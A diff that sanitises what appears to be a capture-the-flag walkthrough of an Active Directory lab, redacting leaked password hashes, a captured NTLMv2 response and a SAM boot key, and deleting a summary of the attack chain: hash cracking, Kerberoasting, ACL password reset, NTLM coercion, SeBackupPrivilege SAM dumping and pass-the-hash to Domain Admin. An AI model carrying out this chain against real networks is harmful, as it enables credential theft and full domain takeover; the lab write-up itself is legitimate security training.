@@ -28,18 +28,17 @@ Your task is to leverage the compromised credentials to escalate privileges, mov
 
 | ID | Username | Full Name | Role | Password Hash |
 |----|----------|-----------|------|---------------|
-| 1 | r.widdleton | Ron Widdleton | Intern Builder | c4a21c4d438819d73d24851e7966229c |
-| 2 | n.bottomsworth | Neville Bottomsworth | Planner | 61ee643c5043eadbcdc6c9d1e3ebd298 |
-| 3 | l.layman | Luna Layman | Planner | 8960516f904051176cc5ef67869de88f |
-| 4 | c.smith | Chen Smith | Builder | bbd151e24516a48790b2cd5845e7f148 |
-| 5 | d.thomas | Dean Thomas | Builder | 4d14ff3e264f6a9891aa6cea1cfa17cb |
-| 6 | s.winnigan | Samuel Winnigan | HR Manager | 078576a0569f4e0b758aedf650cb6d9a |
-| 7 | p.jackson | Parvati Jackson | Shift Lead | eada74b2fa7f5e142ac412d767831b54 |
-| 8 | b.builder | Bob Builder | Electrician | dd4137bab3b52b55f99f18b7cd595448 |
-| 9 | t.ren | Theodore Ren | Safety Officer | bfaf794a81438488e57ee3954c27cd75 |
-| 10 | e.macmillan | Ernest Macmillan | Surveyor | 47d23284395f618bea1959e710bc68ef |
+| 1 | r.widdleton | Ron Widdleton | Intern Builder | [HASH REDACTED] |
+| 2 | n.bottomsworth | Neville Bottomsworth | Planner | [HASH REDACTED] |
+| 3 | l.layman | Luna Layman | Planner | [HASH REDACTED] |
+| 4 | c.smith | Chen Smith | Builder | [HASH REDACTED] |
+| 5 | d.thomas | Dean Thomas | Builder | [HASH REDACTED] |
+| 6 | s.winnigan | Samuel Winnigan | HR Manager | [HASH REDACTED] |
+| 7 | p.jackson | Parvati Jackson | Shift Lead | [HASH REDACTED] |
+| 8 | b.builder | Bob Builder | Electrician | [HASH REDACTED] |
+| 9 | t.ren | Theodore Ren | Safety Officer | [HASH REDACTED] |
+| 10 | e.macmillan | Ernest Macmillan | Surveyor | [HASH REDACTED] |
 
-**Platform:** HackSmarter
 **Difficulty:** Medium
 **OS:** Windows Server 2022
 
@@ -137,7 +136,7 @@ UwU Toolkit hashcrack > run
 [*] Loaded hashes from: /workspace/test.txt
 [*] No hash type specified, attempting to identify...
 [+] Detected hash type: NTLM (or MD5 - mode 0) (mode: 1000)
-[*] Sample hash: c4a21c4d438819d73d24851e7966229c...
+[*] Sample hash: [HASH REDACTED]...
 
 [?] Use hash type 1000 (NTLM (or MD5 - mode 0))? [Y/n]: y
 [*] Transferring hashes to omarchy...
@@ -176,7 +175,7 @@ Started: Wed Dec 31 09:59:58 2025
 Stopped: Wed Dec 31 10:00:00 2025
 
 === CRACKED ===
-c4a21c4d438819d73d24851e7966229c:[REDACTED]
+[HASH REDACTED]:[REDACTED]
 
 [+] Module completed successfully
 ```
@@ -595,7 +594,7 @@ UwU Toolkit ntlm_coerce > run
 With Responder running, when a user browses to the file share, their NTLMv2 hash is captured:
 
 ```
-[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:1122334455667788:A3563E82142632307B9D713C0372140D:010100000000000080B2A37E4D7ADC0152B930A37A5EFEB50000000002000800360036003400410001001E00570049004E002D005A00340039005900460036004C00560056004700480004003400570049004E002D005A00340039005900460036004C0056005600470048002E0036003600340041002E004C004F00430041004C000300140036003600340041002E004C004F00430041004C000500140036003600340041002E004C004F00430041004C000700080080B2A37E4D7ADC0106000400020000000800300030000000000000000000000000400000455817835FCFC4985AA614A80348B6F3AD029231A48C8DBE1D87071FB2F6AEA90A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00320036002E003200330033000000000000000000
+[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:[HASH REDACTED]
 [*] Skipping previously captured hash for BUILDINGMAGIC\h.grangon
 ```
 
@@ -686,7 +685,7 @@ UwU Toolkit sebackup_dump > run
 
     Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
 
-[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c
+[*] Target system bootKey: [REDACTED]
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -720,36 +719,6 @@ Info: Establishing connection to remote endpoint
 ```
 
 **Domain Administrator access achieved!**
-
----
-
-## Attack Chain Summary
-
-```
-Phase 1 - Initial Access
-─────────────────────────────────────
-r.widdleton  : [REDACTED]        → Cracked from leaked MD5 hash
-
-Phase 2 - Kerberoasting
-─────────────────────────────────────
-r.haggard    : [REDACTED]        → Kerberoasted service account
-
-Phase 3 - ACL Abuse (ForceChangePassword)
-─────────────────────────────────────
-h.potch      : [REDACTED]        → Password reset via r.haggard
-
-Phase 4 - NTLM Coercion
-─────────────────────────────────────
-h.grangon    : [REDACTED]        → Hash captured via file share coercion
-
-Phase 5 - Privilege Escalation (SeBackupPrivilege)
-─────────────────────────────────────
-Local Admin  : [REDACTED-HASH]   → SAM hive extraction
-
-Phase 6 - Domain Compromise
-─────────────────────────────────────
-a.flatch     : [REDACTED-HASH]   → Pass-the-Hash as Domain Admin
-```
 
 ---
 
